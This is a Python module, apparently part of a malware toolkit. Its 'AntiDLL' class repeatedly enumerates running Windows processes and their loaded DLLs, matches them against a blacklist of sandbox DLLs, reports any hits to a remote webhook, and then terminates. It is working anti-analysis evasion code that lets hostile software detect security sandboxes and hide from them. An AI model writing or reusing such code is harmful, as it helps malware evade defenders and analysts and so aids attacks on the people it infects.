import os
import time

import win32api
import win32process

from ..constants import Lists
from ..utils.webhook import Webhook


class AntiDLL:
    def __init__(self, webhook_url: str, logger):
        self.webhook_url = webhook_url
        self.logger = logger
        self.webhook = Webhook(self.webhook_url)

    def BlockDLLs(self) -> None:
        while True:
            try:
                time.sleep(1)
                EvidenceOfSandbox = []
                allPids = win32process.EnumProcesses()
                for pid in allPids:
                    try:
                        hProcess = win32api.OpenProcess(0x0410, 0, pid)
                        try:
                            curProcessDLLs = win32process.EnumProcessModules(
                                hProcess)
                            for dll in curProcessDLLs:
                                dllName = str(
                                    win32process.GetModuleFileNameEx(
                                        hProcess, dll)).lower()
                                for sandboxDLL in Lists.BLACKLISTED_DLLS:
                                    if sandboxDLL in dllName:
                                        if dllName not in EvidenceOfSandbox:
                                            EvidenceOfSandbox.append(dllName)
                        finally:
                            win32api.CloseHandle(hProcess)
                    except BaseException:
                        pass
                if EvidenceOfSandbox:
                    self.logger.info(f"The Following DLL's: {EvidenceOfSandbox} Were Found Loaded: Exit Status 1 ")
                    self.webhook.send(
                        f"The following sandbox-indicative DLLs were discovered loaded in processes running on the system. DLLS: {EvidenceOfSandbox}",
                        "Anti DLL",
                    )
                    os._exit(1)
            except BaseException:
                pass
